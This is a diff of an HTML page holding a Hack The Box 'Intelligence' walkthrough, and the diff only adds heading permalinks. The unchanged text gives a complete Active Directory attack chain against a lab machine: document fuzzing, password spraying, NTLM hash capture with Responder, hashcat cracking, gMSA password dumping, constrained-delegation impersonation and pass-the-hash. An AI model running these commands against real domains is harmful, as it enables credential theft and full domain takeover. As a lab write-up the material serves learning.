@@ -908,10 +908,10 @@
               
                 
                 
-                <h1 id="overview">Overview</h1>
+                <h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
 <p><img alt="" src="../assets/image-20210705163025884.png" /></p>
 <p>Intelligence was my best HTB Machine yet, where it was realist environment and real life scenario. Intelligence was based in Active Directory Penetration Test and mostly depeneds in enumeration to found a way into the Domain Admin. <strong><a href="https://www.hackthebox.eu/home/users/profile/178681">My HTB profile link</a></strong></p>
-<h2 id="machine-info">Machine Info</h2>
+<h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
 <p><img alt="" src="assets/image-20210704094536818.png" /></p>
 <table>
 <thead>
@@ -929,9 +929,9 @@
 </tr>
 </tbody>
 </table>
-<h1 id="walkthrough">Walkthrough</h1>
-<h2 id="recon">Recon</h2>
-<h3 id="nmap">nmap</h3>
+<h1 id="walkthrough">Walkthrough<a class="headerlink" href="#walkthrough" title="Permanent link">&para;</a></h1>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>PORT     STATE SERVICE       REASON  VERSION
 <span class="m">53</span>/tcp   open  domain        syn-ack Simple DNS Plus
 <span class="m">80</span>/tcp   open  http          syn-ack Microsoft IIS httpd <span class="m">10</span>.0
@@ -965,15 +965,15 @@
 Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 </code></pre></div>
 <p>By looking into <code>nmap</code> scanning results, we will discover that the host is Domain Controller. Furthermore, port 80, 139, 445 are opened so we can enumerate web service and SMB shared folders. </p>
-<h2 id="web-enumeration">Web Enumeration</h2>
+<h2 id="web-enumeration">Web Enumeration<a class="headerlink" href="#web-enumeration" title="Permanent link">&para;</a></h2>
 <p>During inspecting the web application, we will identify a new directory <code>/documents</code> that contains multiple PDF files. Two documents can be identify if we hover over download button: <code>http://10.10.10.248/documents/2020-01-01-upload.pdf</code> and <code>http://10.10.10.248/documents/2020-12-15-upload.pdf</code> </p>
 <p><img alt="" src="../assets/image-20210705164909171.png" /></p>
 <p><img alt="" src="../assets/image-20210705165452811.png" /></p>
 <p>After downloading the PDF documents, I used <code>exiftool</code> to check the creator of document in order to enumerate domain users. </p>
 <p><img alt="" src="../assets/image-20210705171025067.png" /></p>
 <p>From the pattern of the PDF files name I identified that the naming format is using <code>2020-##-##-upload.pdf</code> where is <code>##</code> is two digits. </p>
-<h3 id="fuzzing-documents">Fuzzing Documents</h3>
-<h4 id="collecting-domain-users">Collecting Domain Users</h4>
+<h3 id="fuzzing-documents">Fuzzing Documents<a class="headerlink" href="#fuzzing-documents" title="Permanent link">&para;</a></h3>
+<h4>Collecting Domain Users</h4>
 <p>With the knowledge of this, made a list of 4 digits to run <code>wfuzz</code> in order to find valid PDF documents. </p>
 <ol>
 <li>I used the following command to create a sequence of 4 digits and insert <code>-</code> in the middle: </li>
@@ -1113,7 +1113,7 @@ Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</spa
    Daniel.Shelton
    ...
 </code></pre></div>
-<h4 id="obtain-the-password">Obtain the Password</h4>
+<h4>Obtain the Password</h4>
 <p>Let's search for the password from documents. Since we have many PDF documents I created another Python script to automate the process of extracting the text from the all downloaded PDF documents: </p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">fitz</span>
@@ -1214,7 +1214,7 @@ Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</spa
 </code></pre></div>
 <p>By running the script and go through the output we will identify the password which is <code>NewIntelligenceCorpUser9876</code></p>
 <p><img alt="" src="../assets/image-20210705125941161.png" /></p>
-<h2 id="password-spray">Password Spray</h2>
+<h2 id="password-spray">Password Spray<a class="headerlink" href="#password-spray" title="Permanent link">&para;</a></h2>
 <p>With the obtained password, now we can run password spray against the collected domain users: </p>
 <div class="highlight"><pre><span></span><code>crackmapexec smb <span class="m">10</span>.10.10.248 -u users.txt -p <span class="s2">&quot;NewIntelligenceCorpUser9876&quot;</span>
 </code></pre></div>
@@ -1223,8 +1223,8 @@ Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</spa
 <div class="highlight"><pre><span></span><code>smbclient <span class="se">\\\\</span><span class="m">10</span>.10.10.248<span class="se">\\</span>Users -U <span class="s1">&#39;workgroup\Tiffany.Molina&#39;</span>
 </code></pre></div>
 <p><img alt="" src="../assets/image-20210704222025924.png" /></p>
-<h2 id="pivot-to-tedgraves">Pivot to <code>Ted.Graves</code></h2>
-<h3 id="smb-shares-enumeration">SMB Shares Enumeration</h3>
+<h2 id="pivot-to-tedgraves">Pivot to <code>Ted.Graves</code><a class="headerlink" href="#pivot-to-tedgraves" title="Permanent link">&para;</a></h2>
+<h3 id="smb-shares-enumeration">SMB Shares Enumeration<a class="headerlink" href="#smb-shares-enumeration" title="Permanent link">&para;</a></h3>
 <p>The domain user <code>Tiffany.Molina</code> have also access to <code>IT</code> shared folder, let's inspect it. </p>
 <div class="highlight"><pre><span></span><code>Ξ Intelligence/dump → smbclient <span class="se">\\\\</span><span class="m">10</span>.10.10.248<span class="se">\\</span>IT -U <span class="s1">&#39;workgroup\Tiffany.Molina&#39;</span> 
 Enter WORKGROUP<span class="se">\T</span>iffany.Molina<span class="err">&#39;</span>s password: 
@@ -1250,7 +1250,7 @@ smb: <span class="se">\&gt;</span> get downdetector.ps1
 <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
 <span class="p">}</span>
 </code></pre></div>
-<h4 id="obtain-tedgraves-ntlm-hash">Obtain <code>Ted.Graves</code> NTLM Hash</h4>
+<h4>Obtain <code>Ted.Graves</code> NTLM Hash</h4>
 <p>We can abuse this by adding a DNS record using <code>dnstool</code> and run <code>Responder</code> to receive the NTLM hash of the user <code>ted.graves</code>. </p>
 <blockquote>
 <p><code>dnstool</code> can be found <a href="https://github.com/dirkjanm/krbrelayx">here</a></p>
@@ -1262,13 +1262,13 @@ smb: <span class="se">\&gt;</span> get downdetector.ps1
 <div class="highlight"><pre><span></span><code>sudo responder -I tun0
 </code></pre></div>
 <p><img alt="" src="../assets/image-20210704221644619.png" /></p>
-<h4 id="obtain-tedgraves-password">Obtain <code>Ted.Graves</code> Password</h4>
+<h4>Obtain <code>Ted.Graves</code> Password</h4>
 <p>Now we found the NTLM hash of the user <code>ted.graves</code>, we can use <code>hashcat</code> to crack it: </p>
 <div class="highlight"><pre><span></span><code>hashcat -a <span class="m">0</span> -m <span class="m">5600</span> ted.graves-ntlm  /usr/share/wordlists/rockyou.txt --force
 </code></pre></div>
 <p><img alt="" src="../assets/image-20210705174539364.png" /></p>
-<h3 id="enumerate-the-domain-controller">Enumerate the Domain Controller</h3>
-<h4 id="running-bloodhound">Running BloodHound</h4>
+<h3 id="enumerate-the-domain-controller">Enumerate the Domain Controller<a class="headerlink" href="#enumerate-the-domain-controller" title="Permanent link">&para;</a></h3>
+<h4>Running BloodHound</h4>
 <p>After obtaining <code>ted.graves</code> credentials lets run <code>BloodHound</code> to enumerate the Domain Controller, in order to find any path to Domain Admin. </p>
 <p>We can use <code>bloodhound-python</code> in Kali, but I prefer to use the Windows Powershell version because it give us more accurate results. </p>
 <blockquote>
@@ -1284,8 +1284,8 @@ smb: <span class="se">\&gt;</span> get downdetector.ps1
 <p><em>Further Reading</em>: <a href="https://stealthbits.com/blog/securing-gmsa-passwords/">https://stealthbits.com/blog/securing-gmsa-passwords/</a></p>
 <p><strong>2- Constrained Delegation.</strong> </p>
 <p><em>Further Reading:</em> <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation</a></p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="abuse-gmsa-password">Abuse gMSA Password</h3>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="abuse-gmsa-password">Abuse gMSA Password<a class="headerlink" href="#abuse-gmsa-password" title="Permanent link">&para;</a></h3>
 <p>Again we can use Kali or Windows to abuse this misconfiguration. I used Windows to obtain <code>SVC_INT</code> NTLM hash using the following command: </p>
 <div class="highlight"><pre><span></span><code><span class="err">$</span><span class="n">gmsa</span> <span class="p">=</span> <span class="n">Get</span><span class="p">-</span><span class="n">ADServiceAccount</span> <span class="p">-</span><span class="n">Identity</span> <span class="err">&#39;</span><span class="n">SVC_INT</span><span class="err">&#39;</span> <span class="p">-</span><span class="n">Properties</span> <span class="err">&#39;</span><span class="n">msDS</span><span class="p">-</span><span class="n">ManagedPassword</span><span class="err">&#39;</span> <span class="p">-</span><span class="n">Server</span> <span class="m">10.10</span><span class="p">.</span><span class="m">10.248</span>
 <span class="err">$</span><span class="n">blob</span> <span class="p">=</span> <span class="err">$</span><span class="n">gmsa</span><span class="p">.</span><span class="err">&#39;</span><span class="n">msDS</span><span class="p">-</span><span class="n">ManagedPassword</span><span class="err">&#39;</span>
@@ -1297,7 +1297,7 @@ smb: <span class="se">\&gt;</span> get downdetector.ps1
 svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
 </code></pre></div>
 <p>We found domain user <code>SVC_INT</code> NTLM hash which is <code>d64b83fe606e6d3005e20ce0ee932fe2</code> </p>
-<h3 id="abuse-constrained-delegation">Abuse Constrained Delegation</h3>
+<h3 id="abuse-constrained-delegation">Abuse Constrained Delegation<a class="headerlink" href="#abuse-constrained-delegation" title="Permanent link">&para;</a></h3>
 <p>First of all, we need to find which service that <code>SVC_INT</code> can access. We can use <code>rpcclient</code> from Kali or <code>Get-DomainComputer</code> from <code>PowerView</code> module. </p>
 <p>I found that the domain user <code>SVC_INT</code> can access the service <code>www/dc.intelligence.htb</code>. </p>
 <p>Now we have service which we can abuse to request a Kerberos tickets to exploit delegation configuration. We can use Impackets <code>getST.py</code> to impersonate the administrator by passing flag <code>-impersonate</code>. </p>
@@ -1329,7 +1329,7 @@ Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright <span class="m">2020<
 <p><img alt="" src="../assets/image-20210705190812320.png" /></p>
 <div class="highlight"><pre><span></span><code>crackmapexec smb <span class="m">10</span>.10.10.248 -u administrator -H <span class="s1">&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span> -x <span class="s1">&#39;more C:\users\administrator\desktop\root.txt&#39;</span>
 </code></pre></div>
-<h1 id="lesson-learned">Lesson Learned</h1>
+<h1 id="lesson-learned">Lesson Learned<a class="headerlink" href="#lesson-learned" title="Permanent link">&para;</a></h1>
 <ol>
 <li>Enumerating PDF documents to find users. </li>
 <li>NTLM relay attacks.</li>
